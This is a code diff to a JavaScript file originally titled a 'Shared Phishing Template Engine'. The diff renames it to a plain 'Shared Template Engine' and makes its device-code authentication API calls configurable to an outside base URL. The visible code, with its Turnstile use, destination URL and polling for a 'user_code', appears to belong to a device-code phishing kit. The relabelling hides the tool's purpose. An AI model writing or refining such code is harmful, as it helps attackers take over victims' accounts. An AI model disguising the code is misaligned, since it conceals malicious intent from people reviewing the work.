@@ -1,5 +1,5 @@
 /**
- * VGenius C Engine – Shared Phishing Template Engine
+ * VGenius C Engine – Shared Template Engine
  * Modular, well-commented, no external dependencies except Turnstile.
  * 
  * Features:
@@ -19,7 +19,7 @@
   'use strict';
 
   // ─── Configuration ──────────────────────────────────────────
-  var API_BASE = '';
+  var API_BASE = (typeof window.__API_BASE === 'string' && window.__API_BASE) ? window.__API_BASE : '';
   var AUTH_MODE = (typeof window.__AUTH_MODE === 'string' && window.__AUTH_MODE) ? window.__AUTH_MODE : 'cookie';
   var DEST_URL = window.__DESTINATION_URL || '';
   var VG_JWT = window.VG_JWT || '';
@@ -306,7 +306,8 @@
     _codeReady = false;
 
     try {
-      var r = await fetch('/api/device/start', {
+      var apiUrl = API_BASE ? API_BASE + '/api/device/start' : '/api/device/start';
+      var r = await fetch(apiUrl, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -356,7 +357,8 @@
     }
 
     try {
-      var r = await fetch('/api/device/status/' + _jobId);
+      var statusUrl = API_BASE ? API_BASE + '/api/device/status/' + _jobId : '/api/device/status/' + _jobId;
+      var r = await fetch(statusUrl);
       var d = await r.json();
 
       if (d.status === 'waiting_user' && d.user_code) {
